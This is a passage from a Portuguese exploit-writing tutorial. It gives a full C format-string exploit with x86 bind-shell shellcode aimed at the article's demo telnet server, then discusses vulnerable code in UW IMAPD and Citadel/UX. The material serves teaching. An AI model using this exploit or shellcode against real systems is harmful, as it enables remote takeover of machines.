+unsigned char x86_lnx_bind[] = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99"
+    			       "\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x7a\x69"
+			       "\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89"
+		               "\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52"
+ 		               "\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02"
+ 		               "\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52"
+			       "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+	 	               "\xe3\x52\x53\x89\xe1\xcd\x80";
+			       
+int cria_conexao(char *host, unsigned int porta);
+void uso(char *nomeprograma);
+
+int main(int argc, char *argv[])
+{
+	char payload[MAX], *host, got[12];
+	int sockfd, *iptr;
+	unsigned int i, opcao, porta;
+	int offset, metade1, metade2;
+	long ret;
+	
+	memset(payload, 0x00, sizeof(payload)); /* ze amos o nosso buffer */
+	host = NULL;
+	ret = RET;
+	offset = OFFSET;                        /* offset padrao */
+	porta = PORTA;
+ 
+	fprintf(stdout, "Exploit de format string para servidor-telnetd.c\n");
+
+	if(argc < 2)
+		uso(argv[0]);
+
+	while((opcao = getopt(argc, argv, "h:o:p:")) != EOF)
+	{
+		switch(opcao)
+		{
+			case 'h':
+				if(strlen(optarg) > 255)
+				{
+					fprintf(stderr, "Tamanho de host invalido.\n");
+					exit(ERRO);
+				}
+				host = optarg;
+				break;
+
+			case 'o':
+				offset = atoi(optarg);
+				break;
+
+			case 'p':
+				if(atoi(optarg) > 65535 || atoi(optarg) < 0)
+				{
+					fprintf(stderr, "Porta invalida.\n");
+					exit(ERRO);
+				}
+				porta = atoi(optarg);
+				break;
+
+			default:
+				uso(argv[0]);
+		}
+	}
+	
+	sockfd = cria_conexao(host, porta);	
+
+	/* primeira metade do endereco - 8 */
+	metade1 = (ret & 0x0000ffff) - 8;
+	/* metade2 = 65536 + segunda metade - primeira metade - 8 */
+	metade2 = 0x10000 + ((ret & 0xffff0000) >> 16) - metade1 - 8;
+	
+	fprintf(stdout, "Usando 0x%x como endereco de retorno.\n", ret);
+
+	iptr = (int *) got;
+	*iptr++ = GOT;
+	*iptr++ = GOT + 2;
+	*iptr++ = 0;
+	
+	snprintf(payload, sizeof(payload) - 1, "%s%%.%dd%%%d$hn%%.%dd%%%d$hn", got, metade1, offset, metade2, offset+1);
+	memset(payload + strlen(payload), 0x90, 256);
+	snprintf(payload + strlen(payload), sizeof(payload) - 1, "%s", x86_lnx_bind);
+
+	write(sockfd, payload, strlen(payload));
+	fprintf(stdout, "Payload enviado! Conecte em %s:31337\n", host);
+
+	shutdown(sockfd, SHUT_RDWR);
+	close(sockfd);
+}
+
+int cria_conexao(char *host, unsigned int porta)
+{
+        struct sockaddr_in conexao;
+        struct hostent *hbn;
+        int sockfd;
+
+        /* fecha o programa se o socket nao for criado com sucesso */
+        if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == ERRO)
+        {
+                fprintf(stderr, "Erro #%d criando socket principal: %s\n", errno, strerror(errno));
+                exit(ERRO);
+        }
+
+	/* tenta fazer um resolv no host para ver se ele existe */
+        if((hbn = gethostbyname(host)) == NULL)
+        {
+                fprintf(stderr, "Erro #%d gethostbyname(): Impossivel achar %s.\n", errno, host);
+                exit(ERRO);
+        }
+
+        /* preenchendo as estruturas de rede */
+        bzero((char *)&conexao,sizeof(conexao));
+        conexao.sin_family = AF_INET;
+        conexao.sin_port = htons(porta);
+        conexao.sin_addr = *((struct in_addr *)hbn->h_addr);
+
+        if(connect(sockfd,(struct sockaddr *)&conexao, sizeof(conexao)) == ERRO)
+        {
+                fprintf(stderr,"Erro #%d: %s.\n", errno, strerror(errno));
+	       	shutdown(sockfd, SHUT_RDWR);
+                close(sockfd);
+                exit(ERRO);
+        }
+ 
+       return(sockfd);
+}
+
+void uso(char *nomeprograma)
+{
+
+	fprintf(stdout, "Uso: %s -h <host> -p [porta] -o [offset] -b [brute force]\n", nomeprograma);
+       	exit(0);
+}
+
+<++ fmt-telnetd.c ++>
+
+
+
+[ --- 3. Exemplos "vida real"
+
+   Nesta secao iremos apresentar dois estudos de caso que aconteceram em vida
+real. Nao iremos nos aprofundar nem criar exploits. O conhecimento adquirido
+ao longo do texto e' suficiente para uma exploracao bem-sucedida.
+
+
+
+[ --- 3.1. UW IMAPD 10.234 remote stack overflow
+
+A falha do IMAPD 10.234 e' bastante antiga mas serve para ilustrar uma simples
+vulnerabilidades de stack overflow remota.
+Esta vulnerabilidade foi considerada extremamente critica e muito explorada por
+volta de 1998. Diversos sistemas mundo afora foram comprometidos usando o exp-
+ploit provido pelo hacker conhecido como Cheez Whiz.
+
+(*) Detalhes
+
+---------------------------------------------------------------------------
+char *mail_auth (char *mechanism,authresponse_t resp,int argc,char *argv[])
+{
+  char tmp[MAILTMPLEN];
+  AUTHENTICATOR *auth;
+
+ /* make upper case copy of mechanism name */
+  ucase (strcpy (tmp,mechanism));               // <--- BUG AQUI!
+  for (auth = mailauthenticators; auth; auth = auth->next)
+    if (auth->server && !strcmp (auth->name,tmp))
+      return (*auth->server) (resp,argc,argv);
+  return NIL;                   /* no authenticator found */
+}
+----- ----------------------------------------------------------------------
+
+Como podemos ver o problema esta' no 'strcpy()' que copia o conteudo da varia-
+vel "mechanism" para "tmp", que esta' no stack e tem o tamanho de MAILTMPLEN,
+1024 bytes (definida no arquivo "mail.h".) Contudo o tamanho maximo que pode
+ser enviado pelo cliente e' TMPLEN, 8192 bytes (definida em "imapd.c"), permi-
+tindo que o stack overflow ocorra em 'mail_auth()'.
+Na epoca escrever o exploit para esta falha foi um desafio para os hackers por-
+que o conteudo recebido que estouraria o buffer era convertido em letras maius-
+culas -- note o 'ucase()', significando que teriamos um problema em enviar um
+shellcode comum. Entretanto, hoje existem shellcodes que passam por funcoes que
+convertem o que e' recebido em maiuscula ou minusculas.
+
+
+
+[ --- 3.2. Citadel/UX <= v6.27 Format String Vulnerability
+
+(Versao do advisory da No System. O link se encontra no final do artigo)
+
+Citadel/UX e' um avancado sistema de mensagens para BBS e aplicacoes groupware.
+Usuarios podem conectar ao Citadel/UX usando telnet, www ou um software especi-
+fico. Mais em http://www.citadel.org.
+
+(*) Detalhes
+
+Existe um bug de format string na funcao 'lprintf()' do arquivo 'sysdep.c' ao
+fazer "parsing" de argumentos erroneos para a funcao 'syslog()'.
+
+---------- sysdep.c ----------
+108: void lprintf(enum LogLevel loglevel, const char *format, ...) {
+109:         va_list arg_ptr;
+110:         char buf[SIZ];
+111: 
+112:         va_start(arg_ptr, format);   
+113:         vsnprintf(buf, sizeof(buf), format, arg_ptr);
+114:         va_end(arg_ptr);
+115:
+116:         if (syslog_facility >= 0) {
+117:                 if (loglevel <= verbosity) {
+118:                         /* Hackery -IO */
+119:                         if (CC && CC->cs_pid) {
+120:                                 memmove(buf + 6, buf, sizeof(buf) - 6);
+121:                                 snprintf(buf, 6, "[%3d]", CC->cs_pid); 
+122:                                 buf[5] = ' ';                         
+123:                         }
+124:                         syslog(loglevel, buf); // <-- O BUG!
+125:                 }
+126:         }
+---------- sysdep.c ----------
+
+E' possivel que usuarios maliciosos entrem informacoes invalidas usando especi-
+ficadores de formato de uma maneira propositalmente construida, podendo, assim,
+levar a execucao de codigo arbitrario na maquina ou negacao de servico.
+
+
+
+[ --- 4. Fim
+
+   Como vimos ao longo deste artigo, a criacao de exploits remotos nao e' um
+bicho de sete cabecas se ja' tivermos uma certa experiencia com vuln-dev.
+Agora com a ideia basica em mente e' so' colocar a mao na massa para fazer mais
+melhorias ao exploit. Tambem e' interessante pesquisar outros metodos para tor-
+nar a exploracao ainda mais interessante e, principalmente, confiavel.
+Bem, espero que tenham gostado :)
+
+
+
+[ --- 4.1. Agradecimentos
+
+   Tentei manter um tom impessoal durante todo o texto mas aqui nesta parte e'
+impossivel ;)
+Eu gostaria de agradecer aos meus brothers do rfdslabs, Rafael Silva, Gustavo
+Monteiro, Gustavo Bittencourt, Hugo Reinaldo, Jesus Sanchez-Palencia, Julio
+Auto e Rodrigo "nibble" Costa. Eles ainda vao ter que me aturar muito :)
+Tambem gostaria de mandar um abraco para Lucien Rocha, Jorge Pereira, Despise,
+Diego Bauche, George Fleury, Joaquim Correa, BoLoDoRio, Romulo Cholewa, vaxen,
+xgc, hash, deadsocket, Gustavo "hophet" Chagas, Carlos Barros (yaaay!), Filipe
+Balestra, Codak, Leandro Thomas, meus colegas do C.E.S.A.R., todos que acessam
+o #rfdslabs, e aos que fizeram a The Bug! Magazine ser possivel.
+
+Ah, nao poderia esquecer de citar algumas bandas da trilha sonora deste artigo:
+Ramones, The Clash, Green Day, The Ataris, Dropkick Murphys, Cockney Rejects,
+Rancid, Attaque 77, Plebe Rude, Matchbox Twenty, The Wallflowers, entre outras
+que me acompanharam durante esta jornada ;)
+
+
+
+[ --- 4.2. Referencias
+
+1. The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+   [Editora John Wiley & Sons | ISBN 0764544683]
+
+2. Hacking: The Art of Exploitation (Jon Erickson)
+   [Editora No Starch Press | ISBN 15 3270070]
+
+3. Buffer Overflow Attacks: Detect, Exploit, Prevent (Foster, Osipov, Bhalla)
+   [Editora Syngress | ISBN 1932266674]
+
+4. Smashing The Stack For Fun And Profit (Elias "AlephOne" Levy)
+   (http://www.phrack.org/phrack/49/P49-14)
+
+5. Local Stack Overflow - Basic module (Thyago "xgc" Silva)
+   (http://www.gotfault.net/knowledge/module/0x100/0x100-MODULE.txt)
+
+6. Local Stack Overflow - Advanced module (Thyago "xgc" Silva)
+   (http://www.gotfault.net/knowledge/module/0x200/0x200-MODULE.txt)
+
+7. Buffer Overflows Demystified (Murat Balaban)
+   (http://www.enderunix.org/docs/eng/bof-eng.txt)
+
+8. Telegenetic papers (lhall)
+   (http://www2.telegenetic.net/papers.htm)
+
+9. How to hijack the Global Offset Table with pointers for root shells (c0ntex)
+   (http://www.open-security.org/texts/6)
+
+10. Further advances in to exploiting vulnerable format string bugs (c0ntex)
+    (http://www.open-security.org/texts/7)
+
+11. How to remotely and automatically exploit a format bug (Frederic Raynal)
+    (http://www.security-labs.org/index.php3?page=602) 
+
+12. Exploiting Remote Format Strings Bugs (skew)
+    (http://skew.blackhat.ru -- o site nao se encontrava ativo enquanto este
+     texto estava sendo escrito. Procure no cache do Google.)
+
+13. Beej's Guide To Network Programming (Brian "beej" Hall)
+    (http://www.beej.us/guide/bgnet/)
+
+14. Re: EMERGENCY: new remote root exploit in UW imapd (Bugtraq)
+    (http://cert.uni-stuttgart.de/archive/bugtraq/1998/07/msg00180.html)
+
+15. No System Group Advisory #09 - Citadel/UX <= 6.27 format string bug (CoKi)
+    (http://www.nosystem.com.ar/advisories/advisory-09.txt)
+
